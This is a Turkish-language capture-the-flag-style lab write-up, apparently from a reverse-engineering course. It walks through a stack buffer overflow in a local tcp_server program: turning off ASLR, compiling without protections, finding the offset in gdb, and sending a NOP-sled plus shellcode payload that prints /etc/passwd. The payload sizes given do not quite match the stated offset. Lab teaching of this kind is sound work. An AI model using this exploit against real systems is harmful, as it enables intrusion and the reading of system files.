# Stack-Smashing

NOTE: Bu örnek https://github.com/mecand/reveng/tree/master/5-StackSmashing/Challenges/example3 adresinden alınmıştır.

NOTE: ASLR kapatılmıştır.
	
	$sudo su
	$echo 0 > /proc/sys/kernel/randomize_va_space
------------------------------------------------------------------------

1- Kaynak kod derlenmiştir.

	$gcc -fno-stack-protector -m32 -no-pie -g -z execstack tcp_server.c -o tcp_server

2- Program çalışma mantığı basit olarak şu şekildedir:

	$./tcp_server [port] ---------------------------------> belirttiğimiz portu dinlemeye başlıyor.

[ikinci terminal açılıp]:

	$python -c "print 'A'*1024" | nc 127.0.0.1 1234	------> dinlenen porta bağlanıp girdi veriyor.

3- Kaç byte'dan sonra bufferın taşacağını bulmak için 1048 tane 'A' girdisi verilmiştir. Ve gdb ile program açılmış
zafiyetin olduğu vyl_read fonksiyonunun ret instructer'ına breakpoint konmuştur.Program çalıştırılmış ve ikinci bir
terminalden de bağlantı yapılmış, girdi verilmiştir.
	
	$python -c "print 'A'*1048" | nc 127.0.0.1 1234
	$gdb -q tcp_server
	(gdb) disas main
	(gdb) disas vuln_read
	(gdb) b *0x........
	(gdb) r 1234

	$python -c "print 'A'*1048" | nc 127.0.0.1 1234

-ilk breakpointte ret instructer'ı çalıştırılmadan önce EIP'ye denk gelecek kısım belirlenmiş. Yani tam olarak 1044. 
byte'dan sonra gidilecek adres yazılabilir.
 
	(gdb) x/300wx $esp


4- Exploit yazma kısmına geçilebilir. Yazılacak exploitteki 'A'ların yerine '\x90' yazılmış ve bunların arasına shellcode yerleştirilmiştir. Ve shellcode 'un başlangıç adresi bulunmuş ve 'BBBB' yerine yazılmıştır.(\x90 yazılmasının sebebi, EIP o adrese gidince eğer geriye düşerse orada hiç bir işlem yapmadan ilerlesin)
İnternetten yapılacak işe özel shellcode indirilmiştir. Kendinizde yazabilirsiniz.(shellcode aslında oppcodelardan oluşan bir code parçasıdır.)
Bu örnekte yapılacak iş '/etc/passwd'yi yazdırmak olacaktır:

shellcode: '\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f'
	   '\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80'
	   '\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80'

Bu shellcode 58 byte'tır ve girdi (840 + shellcode + 146) olarak bölünmüştür.

5- exploit'in prototipi çalıştırılmış ve gdb ile shellcode adresi bulunmuştur.
	
	[1. Terminal]
	(gdb) r 1234	
	
	[2. Terminal]
	$python -c "print '\x90'*840 + '\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80' + '\x90'*146 + 'BBBB'" | nc 127.0.0.1 1234
	
	[1. Terminal]
	(gdb) x/300wx $esp
	
6- exploit'in son hali şu şekilde olacaktır:

	$python -c "print '\x90'*840 + '\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80' + '\x90'*146 + '\xe0\xcd\xff\xff'" | nc 127.0.0.1 1234
